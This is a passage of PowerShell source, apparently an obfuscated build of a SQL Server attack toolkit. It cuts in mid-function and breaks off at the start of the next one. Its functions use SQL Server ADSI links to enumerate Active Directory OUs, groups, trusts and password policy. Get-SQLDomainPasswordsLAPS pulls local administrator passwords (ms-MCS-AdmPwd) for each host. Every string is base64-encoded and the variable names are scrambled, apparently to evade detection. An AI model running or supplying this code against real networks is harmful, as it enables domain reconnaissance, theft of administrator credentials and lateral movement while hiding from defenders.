    {
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AQwBvAG0AcAB1AHQAZQByACkAKABTAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAEYAaQBsAHQAZQByAEMAbwBtAHAAdQB0AGUAcgApACkA'))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0ALABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQB2AGUAcgBzAGkAbwBuACwAbwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0AUwBlAHIAdgBpAGMAZQBQAGEAYwBrACwAdwBoAGUAbgBjAHIAZQBhAHQAZQBkACwAdwBoAGUAbgBjAGgAYQBuAGcAZQBkACwAYQBkAHMAcABhAHQAaAA='))) -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AQwBvAG0AcAB1AHQAZQByACkAKABTAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAEYAaQBsAHQAZQByAEMAbwBtAHAAdQB0AGUAcgApACkA'))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0ALABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQB2AGUAcgBzAGkAbwBuACwAbwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0AUwBlAHIAdgBpAGMAZQBQAGEAYwBrACwAdwBoAGUAbgBjAHIAZQBhAHQAZQBkACwAdwBoAGUAbgBjAGgAYQBuAGcAZQBkACwAYQBkAHMAcABhAHQAaAA=')))            
        }
    }
    End
    {
    }
}
Function  Get-SQLDomainOu
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }
    Process
    {
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBvAHIAZwBhAG4AaQB6AGEAdABpAG8AbgBhAGwAVQBuAGkAdAApAA=='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQAsAGEAZABzAHAAYQB0AGgALABpAG4AcwB0AGEAbgBjAGUAdAB5AHAAZQAsAHcAaABlAG4AYwByAGUAYQB0AGUAZAAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAA='))) -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBvAHIAZwBhAG4AaQB6AGEAdABpAG8AbgBhAGwAVQBuAGkAdAApAA=='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQAsAGEAZABzAHAAYQB0AGgALABpAG4AcwB0AGEAbgBjAGUAdAB5AHAAZQAsAHcAaABlAG4AYwByAGUAYQB0AGUAZAAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAA=')))
        }
    }
    End
    {                                           
    }
}
Function  Get-SQLDomainAccountPolicy
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${_/\___/==\_/\/\/=} = New-Object System.Data.DataTable 
        ${_/\___/==\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAaABpAHMAdABvAHIAeQBsAGUAbgBnAHQAaAA=')))) | Out-Null
        ${_/\___/==\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBvAHUAdAB0AGgAcgBlAHMAaABvAGwAZAA=')))) | Out-Null
        ${_/\___/==\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBvAHUAdABkAHUAcgBhAHQAaQBvAG4A')))) | Out-Null
        ${_/\___/==\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBvAHUAdABvAGIAcwBlAHIAdgBhAHQAaQBvAG4AdwBpAG4AZABvAHcA')))) | Out-Null
        ${_/\___/==\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBpAG4AcAB3AGQAbABlAG4AZwB0AGgA')))) | Out-Null 
        ${_/\___/==\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBpAG4AcAB3AGQAYQBnAGUA')))) | Out-Null
        ${_/\___/==\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAcAByAG8AcABlAHIAdABpAGUAcwA=')))) | Out-Null
        ${_/\___/==\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA==')))) | Out-Null
        ${_/\___/==\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBwAGwAaQBuAGsA')))) | Out-Null
    }
    Process
    {
        if($UseAdHoc){
            ${__/\/=\/=\/\/\_/\} = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG8AbQBhAGkAbgBEAE4AUwApAA=='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAaABpAHMAdABvAHIAeQBsAGUAbgBnAHQAaAAsAGwAbwBjAGsAbwB1AHQAdABoAHIAZQBzAGgAbwBsAGQALABsAG8AYwBrAG8AdQB0AGQAdQByAGEAdABpAG8AbgAsAGwAbwBjAGsAbwB1AHQAbwBiAHMAZQByAHYAYQB0AGkAbwBuAHcAaQBuAGQAbwB3ACwAbQBpAG4AcAB3AGQAbABlAG4AZwB0AGgALABtAGkAbgBwAHcAZABhAGcAZQAsAHAAdwBkAHAAcgBvAHAAZQByAHQAaQBlAHMALAB3AGgAZQBuAGMAaABhAG4AZwBlAGQALABnAHAAbABpAG4AawA='))) -UseAdHoc            
        }else{
            ${__/\/=\/=\/\/\_/\} = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG8AbQBhAGkAbgBEAE4AUwApAA=='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAaABpAHMAdABvAHIAeQBsAGUAbgBnAHQAaAAsAGwAbwBjAGsAbwB1AHQAdABoAHIAZQBzAGgAbwBsAGQALABsAG8AYwBrAG8AdQB0AGQAdQByAGEAdABpAG8AbgAsAGwAbwBjAGsAbwB1AHQAbwBiAHMAZQByAHYAYQB0AGkAbwBuAHcAaQBuAGQAbwB3ACwAbQBpAG4AcAB3AGQAbABlAG4AZwB0AGgALABtAGkAbgBwAHcAZABhAGcAZQAsAHAAdwBkAHAAcgBvAHAAZQByAHQAaQBlAHMALAB3AGgAZQBuAGMAaABhAG4AZwBlAGQALABnAHAAbABpAG4AawA=')))
        }
        ${__/\/=\/=\/\/\_/\} | % {
            ${_/\___/==\_/\/\/=}.Rows.Add(
            $_.pwdHistoryLength,
            $_.lockoutThreshold,
            [string]([string]$_.lockoutDuration -replace '-','') / (60 * 10000000),
            [string]([string]$_.lockOutObservationWindow -replace '-','') / (60 * 10000000),
            $_.minPwdLength,
            [string][Math]::Floor([decimal](((([string]$_.minPwdAge -replace '-','') / (60 * 10000000)/60))/24)),
            [string]$_.pwdProperties,
            [string]$_.whenChanged,
            [string]$_.gPLink 
            ) | Out-Null
        }
        ${_/\___/==\_/\/\/=}
    }
    End
    {                     
    }
}
Function  Get-SQLDomainGroup
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain group to filter for.')]
        [string]$FilterGroup,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if((-not $FilterGroup)){
            $FilterGroup = '*'
        }
    }
    Process
    {
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0ARwByAG8AdQBwACkAKABTAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAEYAaQBsAHQAZQByAEcAcgBvAHUAcAApACkA'))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAYQBkAG0AaQBuAEMAbwB1AG4AdAAsAHcAaABlAG4AYwByAGUAYQB0AGUAZAAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAAsAGEAZABzAHAAYQB0AGgA'))) -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0ARwByAG8AdQBwACkAKABTAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAEYAaQBsAHQAZQByAEcAcgBvAHUAcAApACkA'))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAYQBkAG0AaQBuAEMAbwB1AG4AdAAsAHcAaABlAG4AYwByAGUAYQB0AGUAZAAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAAsAGEAZABzAHAAYQB0AGgA')))            
        }
    }
    End
    {               
    }
}
Function  Get-SQLDomainTrust
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\/==\_/==\_/=\} = New-Object System.Data.DataTable
        ${__/\/==\_/==\_/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABEAG8AbQBhAGkAbgA=')))) | Out-Null
        ${__/\/==\_/==\_/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABEAG8AbQBhAGkAbgBEAG4A')))) | Out-Null
        ${__/\/==\_/==\_/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AHQAeQBwAGUA')))) | Out-Null
        ${__/\/==\_/==\_/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGQAaQByAGUAYwB0AGkAbwBuAA==')))) | Out-Null
        ${__/\/==\_/==\_/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGEAdAB0AHIAaQBiAHUAdABlAHMA')))) | Out-Null
        ${__/\/==\_/==\_/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAGUAbgBjAHIAZQBhAHQAZQBkAA==')))) | Out-Null
        ${__/\/==\_/==\_/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAGUAbgBjAGgAYQBuAGcAZQBkAA==')))) | Out-Null
        ${__/\/==\_/==\_/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAYwBsAGEAcwBzAA==')))) | Out-Null
        ${__/\/==\_/==\_/=\}.Clear()
    }
    Process
    {
        if($UseAdHoc){
            ${_/\_/==\___/=\/\_} = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQB0AHIAdQBzAHQAZQBkAEQAbwBtAGEAaQBuACkA'))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAcwB0AHAAYQByAHQAbgBlAHIALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUALAB0AHIAdQBzAHQAdAB5AHAAZQAsAHQAcgB1AHMAdABkAGkAcgBlAGMAdABpAG8AbgAsAHQAcgB1AHMAdABhAHQAdAByAGkAYgB1AHQAZQBzACwAdwBoAGUAbgBjAHIAZQBhAHQAZQBkACwAdwBoAGUAbgBjAGgAYQBuAGcAZQBkACwAYQBkAHMAcABhAHQAaAA='))) -UseAdHoc            
        }else{
            ${_/\_/==\___/=\/\_} = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQB0AHIAdQBzAHQAZQBkAEQAbwBtAGEAaQBuACkA'))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAcwB0AHAAYQByAHQAbgBlAHIALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUALAB0AHIAdQBzAHQAdAB5AHAAZQAsAHQAcgB1AHMAdABkAGkAcgBlAGMAdABpAG8AbgAsAHQAcgB1AHMAdABhAHQAdAByAGkAYgB1AHQAZQBzACwAdwBoAGUAbgBjAHIAZQBhAHQAZQBkACwAdwBoAGUAbgBjAGgAYQBuAGcAZQBkACwAYQBkAHMAcABhAHQAaAA=')))            
        }
        ${_/\_/==\___/=\/\_} | % {
            ${/=\/=\__/=\/\____} = Switch ($_.trustdirection) {
                0 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) }
                1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGIAbwB1AG4AZAA='))) }
                2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAYgBvAHUAbgBkAA=='))) }
                3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAGQAaQByAGUAYwB0AGkAbwBuAGEAbAA='))) }
            }
            ${_/==\/\/==\__/=\/} = Switch ($_.trustattributes){
                0x001 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBvAG4AXwB0AHIAYQBuAHMAaQB0AGkAdgBlAA=='))) }
                0x002 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBwAGwAZQB2AGUAbABfAG8AbgBsAHkA'))) }
                0x004 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cQB1AGEAcgBhAG4AdABpAG4AZQBkAF8AZABvAG0AYQBpAG4A'))) }
                0x008 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBvAHIAZQBzAHQAXwB0AHIAYQBuAHMAaQB0AGkAdgBlAA=='))) }
                0x010 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAG8AcwBzAF8AbwByAGcAYQBuAGkAegBhAHQAaQBvAG4A'))) }
                0x020 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBpAHQAaABpAG4AXwBmAG8AcgBlAHMAdAA='))) }
                0x040 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAGUAYQB0AF8AYQBzAF8AZQB4AHQAZQByAG4AYQBsAA=='))) }
                0x080 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAcwB0AF8AdQBzAGUAcwBfAHIAYwA0AF8AZQBuAGMAcgB5AHAAdABpAG8AbgA='))) }
                0x100 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAcwB0AF8AdQBzAGUAcwBfAGEAZQBzAF8AawBlAHkAcwA='))) }
                Default {                 
                    $_.trustattributes
                }
            }
            ${/=\_/=\/\/==\__/=} = Switch ($_.trusttype){
                1 {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAHcAbgBsAGUAdgBlAGwAIABUAHIAdQBzAHQAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIABkAG8AbQBhAGkAbgAgAGUAeAB0AGUAcgBuAGEAbAApAA==')))}
                2 {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGwAZQB2AGUAbAAgAFQAcgB1AHMAdAAgACgAQQBjAHQAaQB2AGUAIABEAGkAcgBlAGMAdABvAHIAeQAgAGQAbwBtAGEAaQBuACAALQAgAHAAYQByAGUAbgB0AC0AYwBoAGkAbABkACwAIAByAG8AbwB0ACAAZABvAG0AYQBpAG4ALAAgAHMAaABvAHIAdABjAHUAdAAsACAAZQB4AHQAZQByAG4AYQBsACwAIABvAHIAIABmAG8AcgBlAHMAdAApAA==')))}
                3 {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBJAFQAIAAoAG4AbwBuAC0AVwBpAG4AZABvAHcAcwAgAEsAZQByAGIAZQByAG8AcwAgAHYAZQByAHMAaQBvAG4AIAA1ACAAcgBlAGEAbABtACkA')))}
                4 {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAEUAIAAoAFQAaABlAG8AcgBlAHQAaQBjAGEAbAAgAHQAcgB1AHMAdAAgAHQAeQBwAGUAIAAtACAARABDAEUAIAByAGUAZgBlAHIAcwAgAHQAbwAgAE8AcABlAG4AIABHAHIAbwB1AHAAJwBzACAARABpAHMAdAByAGkAYgB1AHQAZQBkACAAQwBvAG0AcAB1AHQAaQBuAGcAKQA=')))}
            }
            ${__/\/==\_/==\_/=\}.Rows.Add(
                [string]$_.trustpartner,
                [string]$_.distinguishedname,
                [string]${/=\_/=\/\/==\__/=},
                [string]${/=\/=\__/=\/\____},
                [string]${_/==\/\/==\__/=\/},
                [string]$_.whencreated,
                [string]$_.whenchanged,
                [string]$_.objectclass
            ) | Out-Null
        }
        ${__/\/==\_/==\_/=\}
    }
    End
    {               
    }
}
Function  Get-SQLDomainPasswordsLAPS
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/=\_/\_/\__/=\_} = New-Object System.Data.DataTable 
        ${__/=\_/\_/\__/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA==')))) | Out-Null
        ${__/=\_/\_/\__/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA==')))) | Out-Null
        ${__/=\_/\_/\__/=\_}.Clear()
    }
    Process
    {
        if($UseAdHoc){
            ${_/\_/==\___/=\/\_} = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBDAG8AbQBwAHUAdABlAHIAKQA='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAbQBzAC0ATQBDAFMALQBBAGQAbQBQAHcAZAAsAGEAZABzAHAAYQB0AGgA'))) -UseAdHoc            
        }else{
            ${_/\_/==\___/=\/\_} = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBDAG8AbQBwAHUAdABlAHIAKQA='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAbQBzAC0ATQBDAFMALQBBAGQAbQBQAHcAZAAsAGEAZABzAHAAYQB0AGgA')))            
        }
        ${_/\_/==\___/=\/\_} | % {
            ${__/\/\/\_/=\/=\_/} = $_.dnshostname
            ${_/===\_/=\/\_/\_/} = $_.'ms-MCS-AdmPwd'
            if ([string]${_/===\_/=\/\_/\_/})
            {
                ${__/=\_/\_/\__/=\_}.Rows.Add(${__/\/\/\_/=\/=\_/},${_/===\_/=\/\_/\_/}) | Out-Null
            }
        }
        ${__/=\_/\_/\__/=\_}
    }
    End
    {               
    }
}
Function  Get-SQLDomainController
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
